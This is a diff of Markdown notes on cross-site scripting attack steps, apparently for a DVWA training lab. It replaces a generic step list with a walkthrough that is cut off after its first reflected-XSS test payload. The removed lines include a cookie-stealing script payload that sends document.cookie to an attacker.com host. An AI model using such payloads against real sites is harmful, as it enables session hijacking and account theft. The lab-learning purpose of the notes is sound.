@@ -1,18 +1,20 @@
 # XSS Attack Steps
 
-1. **Identify Input Fields**
-    - Locate user input fields (e.g., search boxes, comment forms) in the target application.
+# XSS Attack Steps - DVWA
 
-2. **Test for Input Validation**
-    - Enter harmless scripts like `<script>alert('XSS')</script>` to check if input is sanitized.
+## Target: DVWA - Cross Site Scripting (XSS)
 
-3. **Analyze Output**
-    - Observe if the script executes or if the input is reflected back unsanitized.
+### XSS Types Covered:
+- Reflected XSS
+- Stored XSS
+- DOM-Based XSS
 
-4. **Craft Malicious Payload**
-    - Create a payload to steal cookies or session data, e.g., `<script>document.location='http://attacker.com/?c='+document.cookie</script>`.
+---
 
-5. **Deliver Payload**
-    - Submit the payload through the vulnerable input field.
+## 🔹 1. Reflected XSS
 
-6. **Trigger Execution**
+### Low Security:
+1. Navigate to `Vulnerabilities -> XSS (Reflected)`.
+2. In the **Name** field, enter:
+   ```html
+   <script>alert('XSS')</script>
